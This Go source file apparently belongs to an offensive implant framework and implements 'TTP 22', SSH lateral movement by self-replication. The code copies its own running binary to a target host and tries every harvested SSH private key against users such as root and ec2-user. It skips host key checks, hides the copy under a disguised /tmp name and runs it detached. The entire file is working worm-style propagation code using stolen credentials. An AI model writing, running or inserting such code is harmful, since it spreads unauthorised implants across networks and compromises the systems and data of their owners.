package ttp

// lateral_move.go — TTP 22: SSH lateral movement via self-replication
//
// ATT&CK: T1021.004 (Remote Services: SSH) + T1570 (Lateral Tool Transfer)
//
// Technique:
//   1. Read /proc/self/exe to get current agent binary (self-replication)
//   2. SCP binary to remote host via discovered SSH private keys
//   3. SSH exec: chmod + nohup (detached from session — survives logout)
//
// Tries all discovered SSH keys against users: root, ubuntu, ec2-user, admin.
// Stops at first successful execution.
//
// params format: "<targetIP> [keyPath]"
//   targetIP: IPv4 address of the lateral movement target
//   keyPath:  (optional) explicit key to use; if omitted, all discovered keys tried
//
// Prerequisites: TTP 20 (recon) to find targets, TTP 21 (ssh_harvest) to find keys.

import (
	"fmt"
	"os"
	"os/exec"
	"strings"
	"time"
)

// LateralMove replicates the current agent to a remote host via SSH.
func LateralMove(params string) (string, error) {
	fields := strings.Fields(params)
	if len(fields) < 1 {
		return "", fmt.Errorf("usage: lateral <targetIP> [keyPath]")
	}
	targetIP := fields[0]

	var keyPaths []string
	if len(fields) >= 2 {
		keyPaths = []string{fields[1]}
	} else {
		keyPaths = discoverSSHPrivKeys()
	}
	if len(keyPaths) == 0 {
		return "", fmt.Errorf("no SSH keys found — run TTP 21 first or specify a key path")
	}

	// Get current binary path via /proc/self/exe
	selfPath, err := os.Readlink("/proc/self/exe")
	if err != nil {
		return "", fmt.Errorf("readlink /proc/self/exe: %w", err)
	}

	// Remote drop path: mimics a transient system file
	remotePath := fmt.Sprintf("/tmp/.svc-%d", time.Now().UnixNano()%99991)

	sshOpts := []string{
		"-o", "StrictHostKeyChecking=no",
		"-o", "BatchMode=yes",
		"-o", "ConnectTimeout=10",
		"-o", "PasswordAuthentication=no",
	}

	for _, keyPath := range keyPaths {
		for _, user := range []string{"root", "ubuntu", "ec2-user", "admin"} {
			remote := fmt.Sprintf("%s@%s", user, targetIP)

			// Step 1: SCP current binary to target
			scpArgs := []string{"-i", keyPath}
			scpArgs = append(scpArgs, sshOpts...)
			scpArgs = append(scpArgs, selfPath, remote+":"+remotePath)
			if err := exec.Command("scp", scpArgs...).Run(); err != nil {
				continue
			}

			// Step 2: SSH exec — chmod + nohup + detach
			execCmd := fmt.Sprintf("chmod +x %s && nohup %s > /dev/null 2>&1 &",
				remotePath, remotePath)
			sshArgs := []string{"-i", keyPath}
			sshArgs = append(sshArgs, sshOpts...)
			sshArgs = append(sshArgs, remote, execCmd)
			if err := exec.Command("ssh", sshArgs...).Run(); err != nil {
				// SCP succeeded but exec failed — report partial success
				return fmt.Sprintf("lateral: SCP to %s succeeded, exec failed: %v",
					remote, err), nil
			}

			return fmt.Sprintf("lateral: deployed to %s via %s → %s (detached)",
				remote, keyPath, remotePath), nil
		}
	}

	return "", fmt.Errorf("lateral: all key/user combinations failed for %s", targetIP)
}
